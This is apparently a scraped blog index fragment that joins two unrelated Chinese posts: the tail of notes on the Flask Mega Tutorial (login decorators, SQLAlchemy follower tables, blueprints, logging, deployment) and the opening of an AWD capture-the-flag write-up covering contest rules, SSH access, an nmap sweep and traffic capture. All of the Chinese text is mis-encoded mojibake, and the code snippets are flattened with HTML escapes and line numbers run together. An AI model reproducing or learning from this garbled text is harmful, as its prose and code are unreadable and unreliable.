UserMixinç±»é›†æˆäº†loginæ’ä»¶è¦æ±‚çš„ç”¨æˆ·æ¨¡å‹å±æ€§ï¼Œå°†å…¶æ··å…¥åˆ° User æ¨¡å‹ä¸­ï¼Œå³å¯ç”¨@login_required å®ç°æƒé™æ§åˆ¶ã€‚\n1 2 @app.route(\u0026#39;/result/\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) # NOTEï¼šæœ‰é¡ºåºå…³ç³»ï¼Œåä¹‹åˆ™ä¸ç”Ÿæ•ˆ @login_required ç”¨æˆ·ç³»ç»Ÿï¼ŒåŒ…æ‹¬ç™»å½•ã€ç™»å‡ºã€æ³¨å†Œå‡ ä¸ªåŠŸèƒ½ã€‚ç¼–å†™è¿™äº›åŠŸèƒ½çš„æ­¥éª¤å…¶å®å¾ˆç±»ä¼¼ï¼š\nè®¾è®¡æ•°æ®åº“ï¼Œåœ¨model.pyä¸­ è®¾è®¡è¡¨å•å¯¹è±¡ï¼Œåœ¨form.pyä¸­ è®¾è®¡é¡µé¢ï¼Œåœ¨æ¨¡æ¿.htmlä¸­ è®¾è®¡è§†å›¾å‡½æ•°ï¼Œåœ¨routes.pyä¸­ ä¹Ÿå¯¹åº”äº†mvcæ¡†æ¶çš„è®¾è®¡ç†å¿µï¼Œæ¯”å¦‚è®¾è®¡è¡¨å•å°±æœ‰äº›åƒ javaweb ä¸­çš„ DAO å±‚ã€‚ä½†ä¹Ÿæœ‰åŒºåˆ«ï¼Œ Flask æ¡†æ¶æ›´å¸Œæœ›ä¸šåŠ¡é€»è¾‘å†™åœ¨æ•°æ®åº“æ¨¡å‹ä¸­ï¼Œè€Œè§†å›¾å‡½æ•°å°½é‡ä¿æŒç®€æ´ï¼Œä»¥æ–¹ä¾¿å•å…ƒæµ‹è¯•ã€‚\nPRG æ¨¡å¼ å³ä¸º Post/Redirect/Getï¼Œå…¶æ ¼å¼å¤§æ¦‚å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 @bp.route(\u0026#39;/some_form\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def some_form(): # prepare forms if form.validate_on_submit(): # submit modification return redirect(url_for(\u0026#39;main.some_form\u0026#39;)) elif request.method == \u0026#39;GET\u0026#39;: # GET data return render_template(\u0026#39;some_form.html\u0026#39;, form=form) é»˜è®¤æƒ…å†µï¼Œæäº¤ POST è¯·æ±‚åï¼Œå¦‚æœç›´æ¥åˆ·æ–°æµè§ˆå™¨ï¼Œä¼šé‡æ–°åœ¨ POST ä¸€æ¬¡ã€‚ä½¿ç”¨PRGæ¨¡å¼å³å¯è§£å†³é‡å¤æäº¤è¡¨å•çš„é—®é¢˜ã€‚\n0x04 æ·±å…¥æ•°æ®åº“ï¼šç²‰ä¸æœºåˆ¶ æ•°æ®åº“å…³ç³» è¦å…³æ³¨åˆ«äººï¼Œå°±è¦è®©æ•°æ®åº“è®°ä½æˆ‘å…³æ³¨çš„äººçš„åå­—ï¼Œå½“ç„¶ï¼Œåªè®°ä½åå­—è‚¯å®šä¸å¤Ÿï¼Œä¸‡ä¸€æ”¹åäº†å‘¢ã€‚å› æ­¤æ¯ä¸ªç”¨æˆ·éƒ½éœ€è¦æœ‰å”¯ä¸€æœ‰æ•ˆçš„æ ‡è¯†ï¼ˆå…¶å®æ›´é‡è¦çš„æ˜¯æ€§èƒ½å› ç´ ï¼‰ã€‚æ­£å› å¦‚æ­¤ï¼Œæ•°æ®åº“ä¸­æ¯ä¸ªè¡¨éƒ½è¦æœ‰ä¸€ä¸ªå”¯ä¸€çš„åˆ—ï¼Œç§°ä¸ºä¸»é”®(primary key)ã€‚å½“ä¸åŒè¡¨ä¹‹é—´å­˜åœ¨å…³ç³»ï¼Œä¸€ä¸ªè¡¨è¦é€šè¿‡ä¸»é”®å¯»æ‰¾å…¶ä»–è¡¨é¡¹ï¼Œå…¶ä»–è¡¨çš„ä¸»é”®å‚¨å­˜åœ¨æœ¬è¡¨ä¸­ï¼Œç§°ä¸ºå¤–é”®(foreign key)ã€‚å¤–é”®å…³è”æ—¢å¯ä»¥è¡¨ç¤ºä¸€å¯¹ä¸€çš„å…³ç³»ï¼Œä¹Ÿå¯ä»¥ä¸€å¯¹å¤š(1-\u0026gt;n)ã€‚\nSQLalchemy å¯¹å…³ç³»çš„å®šä¹‰å¦‚ä¸‹ï¼š\nå¤–é”®ï¼šdb.ForeignKey('user.id') å…³ç³»ï¼šdb.relationship('Post', backref='author', lazy='dynamic') å‚æ•°1ï¼šæ‰€å…³è”çš„è¡¨(n in 1-\u0026gt;n)ï¼Œè¿™é‡Œæ˜¯æ¨¡å‹çš„å˜é‡å å‚æ•°2ï¼šç”± \u0026ldquo;n\u0026rdquo; å›è°ƒ \u0026ldquo;1\u0026rdquo; çš„è™šæ‹Ÿå­—æ®µï¼Œç”¨æ³•ï¼špost.author ç²‰ä¸æœºåˆ¶ ç„¶è€Œï¼Œç²‰ä¸æœºåˆ¶åŒ…æ‹¬å…³æ³¨å’Œè¢«å…³æ³¨ã€‚è¿™æ˜¯ä¸€ç§å¤šå¯¹å¤šçš„å…³ç³»ï¼Œäºæ˜¯éœ€è¦ç”¨å«æœ‰ä¸¤ä¸ªå¤–é”®çš„å…³è”è¡¨è¡¨ç¤ºã€‚åˆå› ä¸ºå…³æ³¨è€…å’Œè¢«å…³æ³¨è€…åœ¨ä¸€ä¸ªè¡¨é‡Œï¼ˆUserï¼‰ï¼Œè¿™ç§å…³ç³»åˆç§°ä¸ºè‡ªå¼•ç”¨ã€‚\næ¨¡å‹ å…³è”è¡¨åªæœ‰å¼•ç”¨ç±»å‹ï¼Œæ•…ä¸éœ€è¦æ´¾ç”Ÿæ¨¡å‹ç±»\n1 2 3 4 5 followers = db.Table( \u0026#39;followers\u0026#39;, db.Column(\u0026#39;follower_id\u0026#39;, db.Integer, db.ForeignKey(\u0026#39;user.id\u0026#39;)), db.Column(\u0026#39;followed_id\u0026#39;, db.Integer, db.ForeignKey(\u0026#39;user.id\u0026#39;)) ) ä¸ºUseræ·»åŠ å…³ç³»\n1 2 3 4 5 followed = db.relationship(\u0026#39;User\u0026#39;, # å³ä¾§å®ä½“ secondary=followers, # æŒ‡å®šå…³è”è¡¨ primaryjoin=(followers.c.follower_id == id), # æŒ‡å®šå·¦å…³ç³» secondaryjoin=(followers.c.followed_id == id), # æŒ‡å®šå³å…³ç³» backref=db.backref(\u0026#39;followers\u0026#39;, lazy=\u0026#39;dynamic\u0026#39;), lazy=\u0026#39;dynamic\u0026#39;) # æŒ‡å®šå›è°ƒ å¤æ‚æŸ¥è¯¢ æŸ¥è¯¢ç²‰ä¸åˆ—è¡¨\nSQL è¯­å¥ï¼šSELECT * FROM user, followers WHERE followers.follower_id = 3 AND followers.followed_id = user.id\nSQLalchemy æ¥å£ï¼šuser.followers.all()\nå®é™…æ‰§è¡Œçš„ SQL è¯­å¥ï¼šï¼ˆæ‰“å° query å¯¹è±¡å¾—åˆ°ï¼‰\n1 2 SELECT ,,, FROM user, followers WHERE followers.followed_id = ? AND followers.follower_id = user.id NOTEï¼šå¦‚æœæ–¹æ³•é›†æˆåœ¨modelé‡Œï¼Œæ–¹æ³•åä¸è¦å’Œå­—æ®µåç›¸åŒï¼Œè‡ªå·±å®šä¹‰çš„æ–¹æ³•ä¼šè¦†ç›–è¯¥å­—æ®µã€‚\næŸ¥çœ‹å·²å…³æ³¨ç”¨æˆ·çš„åŠ¨æ€\nSQL è¯­å¥ï¼šSELECT * FROM post JOIN followers on followers.followed_id = post.user_id where followers.follower_id = 2\nSQLalchemy æ¥å£ï¼š\n1 2 3 4 Post.query.join( followers, (followers.c.followed_id == Post.user_id)).filter( followers.c.follower_id == self.id).order_by( Post.timestamp.desc()) å®é™…æ‰§è¡Œçš„SQLè¯­å¥ï¼š\n1 2 3 4 5 6 7 8 9 SELECT ,,, FROM (SELECT ,,, FROM post JOIN followers ON followers.followed_id = post.user_id WHERE followers.follower_id = ? UNION SELECT * FROM post WHERE post.user_id = ? ) AS anon_1 ORDER BY anon_1.post_timestamp DESC ç”±äºpythonçš„å¼±ç±»å‹ç‰¹å¾ï¼Œæœ‰æ—¶å€™å¾ˆéš¾æ˜ç™½å‡½æ•°ä¹‹é—´ä¼ é€’çš„æ˜¯ä»€ä¹ˆå¯¹è±¡ã€‚æˆ‘ä»¬ä»ä¸Šå¾€ä¸‹æ¢³ç†ä¸€éï¼š\nè¯·æ±‚åˆ°è¾¾è·¯ç”±å‡½æ•°ï¼Œå¼€å§‹æ‰§è¡ŒæŸ¥è¯¢Post.query.....ï¼Œæ­¤æ—¶åªæ˜¯åœ¨æ„é€ æŸ¥è¯¢ï¼Œå¹¶æœªå–å¾—æ•°æ®ï¼Œæ­¤æ—¶çš„å¯¹è±¡ç±»å‹ï¼š\u0026lt;class 'sqlalchemy.orm.query.Query'\u0026gt; ç›´åˆ°get(),all(),paginate().itemsç»“æŸç¬¦ç­‰å‡ºç°ï¼ŒæŸ¥è¯¢æ‰è¢«æ‰§è¡Œï¼Œè¿”å›æ•°æ®ç±»å‹å®ä¾‹ï¼Œå¦‚Userã€‚ æ•°æ®ç±»å®ä¾‹ä¼ å…¥æ¨¡æ¿ï¼Œå¹¶ç”±__str__ç­‰æ–¹æ³•å‚ä¸æ¸²æŸ“ã€‚ 0x05 ç½‘ç«™ç¾åŒ– æœ¬æ•™ç¨‹æä¾›çš„flask-bootstrapæ’ä»¶ï¼Œè¾ƒä¸ºç®€é™‹ï¼Œä¸”è¯¥æ’ä»¶å¹´ä¹…å¤±ä¿®ï¼Œé‚æ›¿æ¢ä¹‹ã€‚åœ¨æ­¤ä¹‹å‰ï¼Œå…ˆææ˜ç™½ç›®å‰é¡¹ç›®å‰ç«¯çš„æ¶æ„\n1 2 3 4 5 6 7 /templates auth/ errors/ base.html _posts.html index.html ... æ‰€æœ‰æ¨¡æ¿éƒ½æœ‰ä¸€ä¸ªçˆ¶æ¨¡ç‰ˆï¼šbase.htmlï¼Œå…¶ç»“æ„å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 {% extends \u0026#39;bootstrap/base.html\u0026#39; %} {% block title %}Hallo Wolrd{% endblock %} {% block head %} ... {% endblock %} {% block scripts %} ... {% endblock %} {% block navbar %} ... {% endblock %} {% block content %} ... {% block app_content %}{% endblock %} {% endblock %} app_contentç•™ç©ºï¼Œå³å…¶ä½™æ¨¡æ¿å‡åœ¨app_contentå†…å¡«å……ã€‚\nè¿›ä¸€æ­¥è¿½æº¯bootstrap/base.htmlçš„æºç ï¼Œå‘ç°å…¶å®ƒ block è¯¸å¦‚navbarä¹Ÿéƒ½ç•™ç©ºæˆ–ä»…ä»…é…ç½®äº† Bootstrap çš„ cdnã€‚ ç”±æ­¤ï¼Œåªéœ€å°†base.htmlè¿ç§»å³å¯ã€‚\nåœ¨ç½‘ä¸Šå¯»æ‰¾æ–°çš„UIæ¨¡æ¿ï¼Œä¸è¦åœ¨ä¸­æ–‡äº’è”ç½‘æœç´¢ï¼Œbasically garbageã€‚æ‰¾åˆ°ä¸€ä¸ª Meterial æ¨¡æ¿ è¿˜ç®—é¡ºçœ¼ï¼Œé‚ç”¨ä¹‹ã€‚\nä¸ç†Ÿæ‚‰ Bootstrap å¸ƒå±€çš„å¯ä»¥ä½¿ç”¨å¯è§†åŒ–å·¥å…·æ¥è®¾è®¡å‰ç«¯ï¼Œå¦‚ï¼šhttp://www.ibootstrap.cn/\nå¯¹ç…§æ¨¡æ¿ï¼Œå°†base.htmlæç©ºï¼Œæ•ˆæœå¦‚ä¸‹ï¼š\né‡åˆ°çš„bugæœ‰ï¼š\nä¸‹æ‹‰èœå•å¤±æ•ˆï¼šæŸ¥è¯¢å¾—çŸ¥æœ‰å¯èƒ½æ˜¯bootstrapç‰ˆæœ¬å†²çª //ç»“æœå¹¶ä¸æ˜¯ï¼Œåªæ˜¯å¿˜è®°å¼•å…¥jsæ–‡ä»¶è€Œå·²ï¼Œæˆ‘æ˜¯å‚»é€¼ã€‚ æ–‡ä»¶ä¸Šä¼ æŒ‰é’®æ¶ˆå¤±ï¼šæœ¬æ•™ç¨‹ä¸­ï¼Œè¡¨å•æ¸²æŸ“é‡‡ç”¨wtf.quick_form()ï¼Œè¿™ç©æ„è¿˜æ˜¯æ¥è‡ªbootstrap/wtf.html æœ€åå†³å®šæ•´ä¸ªğŸäº† Flask-Bootstrap æ’ä»¶ã€‚\nå¯Œæ–‡æœ¬ç¼–è¾‘å™¨ åœ¨ã€ŠFlask Webå¼€å‘ï¼šåŸºäºPythonçš„Webåº”ç”¨å¼€å‘å®æˆ˜ã€‹ä¸­æåˆ°äº†markdownç¼–è¾‘å™¨çš„å®ç°ã€‚\néœ€è¦çš„åŒ…ï¼š\nPageDown: JS ç‰ˆ Markdown æ¸²æŸ“å™¨ï¼Œç”¨äºå®¢æˆ·ç«¯é¢„è§ˆã€‚ Flask-PageDown: flask é›†æˆæ’ä»¶ã€‚è¯¥æ’ä»¶éœ€è¦æ³¨å†Œ Markdown: Python ç‰ˆ Markdown æ¸²æŸ“å™¨ï¼Œç”¨äºæœåŠ¡ç«¯æ¸²æŸ“ã€‚ Bleach: HTML æ¸…ç†å™¨ï¼Œä¿è¯å®‰å…¨æ€§ ä¸ºäº†å…¼é¡¾å®‰å…¨å’Œæ•ˆç‡ï¼Œåšæ³•æ˜¯åŒæ—¶ä¿å­˜ markdown æºæ–‡æœ¬å’Œ HTML æ–‡ä»¶ã€‚æ­¥éª¤å¦‚ä¸‹ï¼š\nè¡¨å•æ”¹ä¸º PageDownField æ¨¡æ¿å¼•å…¥ PageDown å®ï¼Œä»¥å®ç°å³æ—¶é¢„è§ˆ ä¸º Post æ¨¡å‹å¢åŠ å­—æ®µï¼Œå¹¶æ·»åŠ  markdown æ¸²æŸ“æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¸ºç±»æ–¹æ³•ï¼Œéœ€è¦@staticmethodä¿®é¥° åœ¨æ¨¡å‹å¤–éƒ¨ç›‘å¬æ•°æ®åº“äº‹ä»¶ï¼Œä»…å½“ markdown æ–‡æœ¬å‡ºç°å˜åŠ¨æ—¶è°ƒç”¨æ¸²æŸ“æ–¹æ³•ã€‚ ä¿®æ”¹æ¨¡æ¿ä»¥æ˜¾ç¤ºæœåŠ¡ç«¯è¿”å›çš„ html æ–‡æœ¬ ç„¶è€Œé¢„è§ˆå™¨è¿‡äºç®€é™‹ï¼Œä¹Ÿå¾ˆéš¾ä¿®æ”¹ã€‚åœ¨githubä»“åº“ä¸Šå‘ç°è¯¥æ’ä»¶ä¹Ÿæ˜¯æœ¬æ•™ç¨‹ä½œè€…å†™çš„ï¼Œå·²ç»å¾ˆä¹…æ²¡æœ‰ç»´æŠ¤ã€‚é¡¿æ—¶å¯¹æœ¬ä¹¦ä½œè€…æœ‰äº›ä¸æ»¡ã€‚\n0x06 æ¨¡å—åŒ–åº”ç”¨ï¼šåŠŸèƒ½è§£è€¦ ä¿æŒ app ä½œä¸ºå…¨å±€å˜é‡çš„æ¨¡å¼ï¼Œå¯èƒ½ä¼šç»™åç»­å¼•å…¥æ–°åŠŸèƒ½å’Œå•å…ƒæµ‹è¯•å¸¦æ¥éº»çƒ¦ã€‚ è¦é€‚åº”å¤§å‹é¡¹ç›®éœ€æ±‚ï¼Œéœ€è¦æŠŠç½‘ç«™åŠŸèƒ½æ‹†åˆ†æˆç‹¬ç«‹çš„æ¨¡å—ã€‚\nBlueprintåŒ– è¦å®ç°è§£è€¦ï¼Œä¸€ç§åŠŸèƒ½çš„ç›¸å…³ä»£ç å¯ä»¥å€ŸåŠ©Blueprintå½’ç±»åˆ°ä¸€ä¸ªåŒ…é‡Œã€‚å…¶æ–‡ä»¶ç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 app/ some_fuction/ \u0026lt;-- blueprint package __init__.py \u0026lt;-- blueprint creation ... other code ... templates/ some_fuction/ \u0026lt;-- templates __init__.py \u0026lt;-- blueprint registration åˆ›å»ºblueprintä¸åˆ›å»ºåº”ç”¨éå¸¸ç›¸ä¼¼ã€‚\n1 2 3 from flask import Blueprint bp = Blueprint(\u0026#39;func\u0026#39;, __name__) from app.func import Func è€Œæ¶ˆç­äº†appï¼Œè“å›¾å†…éƒ¨çš„å¼•ç”¨ç»Ÿä¸€å˜æˆäº†è“å›¾åã€‚è€Œå¤–éƒ¨è¯¸å¦‚url_forçš„å‚æ•°åˆ™éœ€è¦åŠ ä¸ŠåŒ…å.åšå‰ç¼€ã€‚\nåº”ç”¨å·¥å‚æ¨¡å¼ å·¥å‚å‡½æ•°æ˜¯ä¸€ä¸ªå¤–éƒ¨å‡½æ•°ï¼Œåœ¨è¿™ä¸ªå‡½æ•°å†…éƒ¨æ‰§è¡Œæ’ä»¶æ³¨å†Œå’Œé…ç½®å·¥ä½œï¼Œå¹¶é€šè¿‡ä»–è¿”å›åº”ç”¨å®ä¾‹ã€‚\n1 2 3 4 5 6 7 8 # app/__init__.py db = SQLAlchemy() # ... def create_app(config_class=Config): app = Flask(__name__) app.config.from_object(config_class) db.init_app(app) # ... è¿”å›åï¼Œflaskæä¾›çš„ä¸Šä¸‹æ–‡å¯¹è±¡current_appå°†æŒ‡å‘åº”ç”¨å®ä¾‹ã€‚è¯¦è§å®˜æ–¹æ–‡æ¡£ï¼šåº”ç”¨ä¸Šä¸‹æ–‡\nå¤šçº¿ç¨‹ current_appæ˜¯çº¿ç¨‹ç»‘å®šçš„ï¼Œè‹¥è¦åœ¨è¯¸å¦‚é‚®ä»¶æœåŠ¡çš„ä½äºå…¶ä»–çº¿ç¨‹çš„åŠŸèƒ½è°ƒç”¨ä»–ï¼Œåˆ™ä¼šå‘ç°æ²¡æœ‰èµ‹å€¼ã€‚ éœ€è¦ä½¿ç”¨current_app._get_current_object()è¡¨è¾¾å¼ã€‚\nPythonæ¦‚å¿µè¾¨æï¼šåŒ…ï¼Œåº“ï¼Œæ’ä»¶ åŒ… (package) æ˜¯æŒ‡ä¸€ç§ä»£ç ç»“æ„ï¼Œåªè¦æœ‰æ–‡ä»¶å¤¹å’Œ __init__.py éƒ½æ˜¯åŒ…ã€‚ åº“ (library) å’Œæ’ä»¶ (plugin) éƒ½æ˜¯ä»å¤–éƒ¨å¼•å…¥çš„åŒ…ï¼ŒåŒºåˆ«åœ¨äºï¼Œæ’ä»¶è¦é›†æˆè¿›åº”ç”¨ï¼Œæ‰€ä»¥éœ€è¦æ³¨å†Œç­‰æ­¥éª¤ï¼›è€Œåº“æ›´ç‹¬ç«‹ï¼Œå¯ä»¥éšæ—¶éšåœ°è°ƒç”¨\n0x07 å¼€å‘å¸®æ‰‹ æœ¬èŠ‚è®²è§£ä¸€äº›æ‚é¡¹ã€‚\nè°ƒè¯• flask shellå‘½ä»¤ï¼šä¸ºé¿å…æ¯æ¬¡è°ƒè¯•éƒ½è¦é‡æ–°import appï¼Œä½¿ç”¨ä¸Šä¸‹æ–‡è°ƒç”¨è§£é‡Šå™¨ï¼Œç”¨@app.shell_context_processorè£…é¥°ä¸Šä¸‹æ–‡å‡½æ•° å•å…ƒæµ‹è¯• unittest åº“ï¼Œè¯¦è§ä¸‹ä¸€ç¯‡ã€‚\nè®°å½•æ—¥å¿—åˆ°æ–‡ä»¶ logger åº“\n1 2 3 4 5 6 7 8 9 10 11 12 if not app.debug: if not os.path.exists(\u0026#39;logs\u0026#39;): os.mkdir(\u0026#39;logs\u0026#39;) file_handler = RotatingFileHandler(\u0026#39;logs/microblog.log\u0026#39;, maxBytes=10240, backupCount=10) file_handler.setFormatter(logging.Formatter( \u0026#39;%(asctime)s %(levelname)s: %(message)s [in %(pathname)s:%(lineno)d]\u0026#39;)) file_handler.setLevel(logging.INFO) app.logger.addHandler(file_handler) app.logger.setLevel(logging.INFO) app.logger.info(\u0026#39;Microblog startup\u0026#39;) requirement.txt è£…çš„åº“å¤ªå¤šæ€ä¹ˆåŠï¼Ÿåªéœ€è¦ä¸¤æ¡å‘½ä»¤ï¼š\n1 2 pip freeze \u0026gt; requirements.txt pip install -r requirements.txt 0x08 ç½‘ç«™ä¸Šçº¿ æœ€åç®€å•åˆ—å‡ºå‡ ç§ç½‘ç«™éƒ¨ç½²çš„æ–¹æ³•ï¼Œè¯¦æƒ…å‚è€ƒæœ¬æ•™ç¨‹æˆ–è‡ªè¡Œæœç´¢ã€‚\nnativeæ¨¡å¼ ä¹°ä¸»æœº è¿ä¸»æœºï¼šssh ä¹°åŸŸå é…åŸŸå é…ç¯å¢ƒ æ•°æ®åº“ æœåŠ¡å™¨ å…¶ä»–ä¾èµ– æŒç»­è¿ç»´ å®¹å™¨åŒ–æŠ€æœ¯ï¼šdocker å†™dockerfile docker-compose up \u0026ndash;build -d äº‘æŠ€æœ¯ï¼šPaaS æ³¨å†Œäº‘å¹³å°è´¦æˆ· å†™Procfile git push ","date":"2021-09-09T20:18:56Z","permalink":"https://lonelyuan.github.io/p/%E5%B9%B4%E8%BD%BB%E4%BA%BA%E7%9A%84%E7%AC%AC%E4%BA%8C%E4%B8%AA%E7%BD%91%E7%AB%99-the-flask-mega-tutorial/","title":"å¹´è½»äººçš„ç¬¬äºŒä¸ªç½‘ç«™ - The Flask Mega Tutorial"},{"content":"ğŸ› è¿™æ˜¯ğŸ‘´ç¬¬ä¸€æ¬¡æ‰“é«˜è¾¾80æ”¯é˜Ÿä¼çš„å¤§å‹AWDï¼ŒğŸ‘´æ­¤è¡Œçš„ç›®æ ‡å°±æ˜¯ç§°éœ¸é…’åº—çš„æ¸¸æ³³æ± ã€‚åæ¥å‘ç°æ¸¸æ³³æ± è¦é’±ï¼ŒğŸ‘´åªèƒ½é—æ†¾è´¥åŒ—ã€‚ï¼ˆåæ¥å‘ç°æƒ…æŠ¥å‡ºäº†é—®é¢˜ï¼Œæ ¹æœ¬ä¸è¦é’±ï¼Œè¡€äºï¼‰æ€»çš„æ¥è¯´ï¼Œé…’åº—æµ´ç¼¸å¾ˆå¸¦ï¼Œä¸»åŠæ–¹æ€åº¦å¾ˆå¥½ï¼Œèµ›åœºå¾ˆæ¸…çœŸï¼Œå‚èµ›ä½“éªŒå¾ˆçˆ½ï¼Œèµšäº†ã€‚\nâ€œç»ˆç«¯è¶Šç‚«ï¼Œå—¨å®¢è¶Šå¸¦ï¼›å—¨å®¢è¶Šå¸¦ï¼Œå¸½å­è¶Šå¸¦â€\nğŸAWDå¤ç›˜ é¦–å…ˆæ ¹æ®å‚èµ›æ‰‹å†Œï¼Œè¿›è¡Œä¸€ä¸ªè§„åˆ™çš„å¤åˆ¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 1ã€ é‡‡ç”¨çº¿ä¸‹èµ›çš„æ–¹å¼ï¼Œå‚èµ›å›¢é˜Ÿé€šè¿‡æœ‰çº¿è¿æ¥åˆ°å±€åŸŸç½‘ï¼Œå¹¶è¿›è¡Œç½‘ç»œè¿é€šæ€§çš„æµ‹è¯•ã€‚è¯·è‡ªå¤‡è¿æ¥ç½‘ç»œæ‰€éœ€è¦çš„è®¾å¤‡å¦‚usbè½¬RJ45è½¬æ¢å™¨ç­‰å·¥å…·ã€‚ 2ã€ æ”»é˜²èµ›éƒ¨ç½²è‹¥å¹²é“èµ›é¢˜ï¼Œåˆå§‹åˆ†å€¼ä¸º10500åˆ†ã€‚ 3ã€ ä½¿ç”¨xctfç”¨æˆ·é€šè¿‡sshè¿æ¥GameBoxï¼ŒGameBoxçš„ipåœ°å€å’Œç™»å½•å¯†ç é€šè¿‡èµ›äº‹é¡µé¢ä¸‹è½½è·å–ã€‚ 4ã€ æ¯”èµ›10åˆ†é’Ÿ/å›åˆï¼Œæ¯ä¸ªå›åˆä¼šæ›´æ–°GameBoxä¸Šçš„flagã€‚ 5ã€ æ¯ä¸ªå›åˆå†…ï¼Œä¸€ä¸ªæˆ˜é˜Ÿçš„ä¸€ä¸ªæœåŠ¡è¢«æ¸—é€æ”»å‡»æˆåŠŸï¼ˆè¢«è·å–åˆ°flagå¹¶æäº¤ï¼‰ï¼Œåˆ™æ‰£é™¤10åˆ†ï¼Œæ”»å‡»æˆåŠŸçš„æˆ˜é˜Ÿå¹³åˆ†è¿™äº›åˆ†æ•°ã€‚ 6ã€ æ¯ä¸ªå›åˆå†…ï¼ŒæœåŠ¡å®•æœºæˆ–æ— æ³•é€šè¿‡checkåˆ™ä¼šè¢«æ‰£é™¤10åˆ†ï¼ŒæœåŠ¡æ­£å¸¸çš„æˆ˜é˜Ÿå¹³åˆ†è¿™äº›åˆ†æ•°ã€‚ 7ã€ å‚èµ›æˆ˜é˜Ÿåœ¨ä¿®å¤æ¼æ´æ—¶ï¼Œè¯·ä¿æŒæœåŠ¡çš„æ­£å¸¸åŠŸèƒ½å’Œæ‰“å°å­—ç¬¦ã€ç•Œé¢æ ·å¼ï¼Œå¦åˆ™å°†æ— æ³•é€šè¿‡ç³»ç»Ÿcheckã€‚ 8ã€ æ¯ä¸ªå›åˆå†…ï¼ŒæœåŠ¡å¼‚å¸¸å’Œè¢«æ‹¿flagå¯ä»¥åŒæ—¶å‘ç”Ÿï¼Œå³æˆ˜é˜Ÿåœ¨ä¸€ä¸ªå›åˆå†…å•ä¸ªæœåŠ¡å¯èƒ½ä¼šè¢«æ‰£é™¤ä¸¤è€…å åŠ çš„åˆ†æ•°ï¼Œæœ€å¤šæ‰£é™¤20åˆ†ã€‚ ã€‚ã€‚ã€‚ 7ã€ è¯·å‚èµ›æˆ˜é˜Ÿåœ¨æ¯”èµ›å¼€å§‹æ—¶å¯¹æ‰€æœ‰æœåŠ¡è¿›è¡Œå¤‡ä»½ï¼Œä¸»åŠæ–¹ä»…æä¾›2æ¬¡é‡ç½®æœºä¼šï¼Œ2æ¬¡æœºä¼šä½¿ç”¨åä¸äºˆé‡ç½®ã€‚ç”³è¯·é‡ç½®æ—¶è¯·æä¾›æˆ˜é˜Ÿåç§°ã€‚ 8ã€ ç¦æ­¢ä½¿ç”¨é€šç”¨é˜²å¾¡æ–¹æ³•å¦‚wafç­‰å·¥å…·ï¼Œè¿è§„è€…ç¬¬ä¸€æ¬¡è¢«å‘ç°æ‰£é™¤å½“å‰åˆ†å€¼çš„10%ï¼Œç¬¬äºŒæ¬¡è¢«å‘ç°æ‰£é™¤å½“å‰åˆ†å€¼çš„50%ï¼Œç¬¬ä¸‰æ¬¡è¢«å‘ç°å–æ¶ˆå‚èµ›èµ„æ ¼å¹¶å‘å…¶å­¦æ ¡å‘æ–‡è¿›è¡Œé€šæŠ¥æ‰¹è¯„ã€‚ æ¯”èµ›å…¨ç¨‹æ”¶æ‰‹æœºï¼Œæ–­å¤–ç½‘ï¼Œä¸èƒ½ç”¨wafï¼Œä¸å‡†ç”¨ä¸æ­»é©¬ï¼Œå¤§å®¶éƒ½å¾ˆæ¸…çœŸï¼Œæ‰¾å›äº†ctfæœ€åˆçš„å¿«ä¹ã€‚ ç„¶åæŒ‰ç…§AWDå¼€å±€çš„ä»»åŠ¡æ¸…å•ï¼Œè¿›è¡Œä¸€ä¸ªç›˜çš„å¤ï¼š\nå‡†å¤‡é˜¶æ®µ sshè¿æ¥ï¼š ä¸»åŠæ–¹æä¾›äº†sshå¯†é’¥ï¼Œå’Œé¶æœºip äºæ˜¯çœç•¥ ssh-copy-id -i ~/.ssh/id_rsa.pub root@xx.xx.xx.xxç¯èŠ‚ã€‚ ä½†æ˜¯ä¸‡èƒ½çš„Windows Terminalè¿ä¸ä¸Šå»ï¼ˆä¾ç„¶ä¸çŸ¥é“ä¸ºå•¥ï¼‰ï¼ŒğŸ‘´åªèƒ½ç”¨å›¾å½¢åŒ–sshå®¢æˆ·ç«¯æ·»åŠ ç§é’¥è¿æ¥ã€‚ IPæ‰«æï¼š å…±æœ‰7é“é¢˜ï¼Œ3é“webï¼Œ4é“pwnï¼Œæ¯é“é¢˜ç›®ä¸€ä¸ªç‹¬ç«‹é¶æœºï¼Œæœ‰ç‹¬ç«‹çš„ipåœ°å€ã€‚ä¸åŒé¶æœºdæ®µä¸åŒï¼Œä¸åŒé˜Ÿä¼cæ®µä¸åŒï¼ŒæŒ‰åˆèµ›æ’ååˆ†é…ã€‚å¹³å°ä¸Šå‘ŠçŸ¥äº†å…¨éƒ¨çš„ipåˆ—è¡¨ã€‚ äºæ˜¯çœç•¥nmap -sn xx.xx.xx.0/24ç¯èŠ‚ã€‚ é€‰æ‰‹æœºå’Œé¶æœºæ± åœ¨ä¸€ä¸ªå±€åŸŸç½‘å†…ã€‚ä¸åŒé˜Ÿä¼cæ®µä¸åŒï¼Œä¸€ä¸ªé˜Ÿä¼å†…çš„ä¸åŒç”µè„‘dæ®µä¸åŒã€‚ æµé‡ç›‘æ§ï¼š ä¸»åŠæ–¹è´´å¿ƒçš„æä¾›äº†è¢«æ‰“æµé‡(ä½†æ˜¯åªæœ‰ä¸‹è¡Œæµé‡)ï¼Œç›´æ¥åœ¨~/packageç›®å½•ä¸‹ç»™å‡º.pcapæ–‡ä»¶ã€‚ äºæ˜¯çœç•¥tcpdump tcp -i eth0 -t -s 0 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.capç¯èŠ‚ã€‚ (ä¸è¿‡ç”¨æˆ·åå«xctfï¼Œæƒé™å¡çš„å¾ˆæ­»ã€‚ä¸ç»™æµé‡çš„è¯ä¼°è®¡ä¹Ÿåªèƒ½åœ¨ç«™é‡Œä¸Šæµé‡ç›‘æ§è„šæœ¬) æ›´æ–°é€Ÿåº¦å¾ˆå¿«ï¼Œè¢«æ‰“ä¹‹åå‡ ä¹å¯ä»¥ç«‹åˆ»æ‰¾åˆ°æµé‡ã€‚äºæ˜¯æ‰‹é€Ÿå¾ˆé‡è¦ã€‚ 